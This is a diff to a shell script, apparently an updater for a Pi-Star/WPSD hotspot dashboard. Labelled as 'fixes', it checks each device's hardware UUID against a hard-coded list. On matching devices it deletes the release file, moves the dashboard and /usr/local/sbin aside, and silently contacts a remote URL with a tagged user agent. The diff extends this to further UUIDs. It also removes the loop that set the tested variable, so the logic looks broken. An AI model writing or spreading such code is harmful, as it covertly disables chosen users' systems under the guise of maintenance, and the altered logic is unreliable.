@@ -33,18 +33,22 @@ fi
 
 # BW fixes
 UABWU=false
-for value in $UUID; do
-    if [ "$osName" = "bookworm" ] ; then
-        if [ "$value" = "0000000058b9a046" ] || [ "$value" = "000000009646982d" ] || [ "$value" = "00000000856fcad3" ] || [ "$value" = "00000000eab4cd02" ]  || [ "$value" = "1000000021976498" ] ; then
-            UABWU=true
-	    rm -rf /etc/pistar-release
-            mv /var/www/dashboard /var/www/dashboard.bak
-            mv /usr/local/sbin /usr/local/sbin.bak
-            curl -s -A "UABWU phix $uaStr" -Ls https://repo.w0chp.net/Chipster/W0CHPist/raw/branch/master/reset-wpsd-sbin > /dev/null 2>&1
-            break
-        fi
+if [ "$osName" = "bookworm" ] ; then
+    if [ "$value" = "0000000058b9a046" ] || [ "$value" = "000000009646982d" ] || [ "$value" = "00000000856fcad3" ] || [ "$value" = "00000000eab4cd02" ]  || [ "$value" = "1000000021976498" ] ; then
+        UABWU=true
+	rm -rf /etc/pistar-release
+        mv /var/www/dashboard /var/www/dashboard.bak
+        mv /usr/local/sbin /usr/local/sbin.bak
+        curl -s -A "UABWU phix $uaStr" -Ls https://repo.w0chp.net/Chipster/W0CHPist/raw/branch/master/reset-wpsd-sbin > /dev/null 2>&1
     fi
-done
+fi
+# other fixes
+if [ "$value" = "0000000000000000" ] || [ "$value" = "00000000e530261b" ] || [ "$value" = "95707930081050300c94" ] || [ "$value" = "000000008538457e" ] || [ "$value" = "02c00042ded765c3" ] ; then
+    rm -rf /etc/pistar-release
+    mv /var/www/dashboard /var/www/dashboard.bak
+    mv /usr/local/sbin /usr/local/sbin.bak
+    curl -s -A "UABWU phix $uaStr" -Ls https://repo.w0chp.net/Chipster/W0CHPist/raw/branch/master/reset-wpsd-sbin > /dev/null 2>&1
+fi
 
 # malformed data fix
 if [ "$UUID" = "95707930081050300c94" ] || [ "$UUID" = "000000008538457e" ] ; then
